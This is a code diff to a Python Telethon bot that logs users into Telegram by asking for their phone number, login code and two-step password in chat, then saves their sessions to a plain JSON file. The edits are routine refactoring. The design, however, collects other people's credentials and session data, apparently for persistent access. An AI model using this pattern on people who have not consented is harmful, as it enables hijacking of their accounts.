@@ -1,16 +1,12 @@
+import os
 import asyncio
 import json
-import os
 from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 
 user_states = {}    # Tracks user login steps by chat_id
 user_clients = {}   # Stores TelegramClient instances by chat_id
 SESSIONS_FILE = "sessions.json"
-api_id = int(os.getenv("API_ID"))
-api_hash = os.getenv("API_HASH")
-
-client = TelegramClient('bot_session', api_id, api_hash)
 
 def save_sessions():
     data = {}
@@ -101,13 +97,15 @@ async def handle_message(event):
                 return
 
             try:
+                # Normal sign-in attempt with code
                 await client.sign_in(state["phone"], text)
                 await event.reply("Logged in successfully!")
                 state["step"] = "logged_in"
                 save_sessions()
             except errors.SessionPasswordNeededError:
+                # 2FA password required, ask user for it
                 state["step"] = "awaiting_2fa_password"
-                await event.reply("Two-step verification enabled. Send your password.")
+                await event.reply("Two-step verification enabled. Please enter your password.")
             except errors.CodeInvalidError:
                 await event.reply("Invalid code. Try again.")
             except Exception as e:
@@ -123,7 +121,8 @@ async def handle_message(event):
                 return
 
             try:
-                await client.check_password(text)
+                # Use sign_in with password to complete 2FA
+                await client.sign_in(password=text)
                 await event.reply("Password accepted! Logged in.")
                 state["step"] = "logged_in"
                 save_sessions()
@@ -155,6 +154,10 @@ async def all_messages(event):
 
 async def main():
     global client
+    API_ID = int(os.getenv("API_ID"))
+    API_HASH = os.getenv("API_HASH")
+
+    client = TelegramClient('bot_session', API_ID, API_HASH)
     await client.start()
     print("Bot is running...")
     await client.run_until_disconnected()
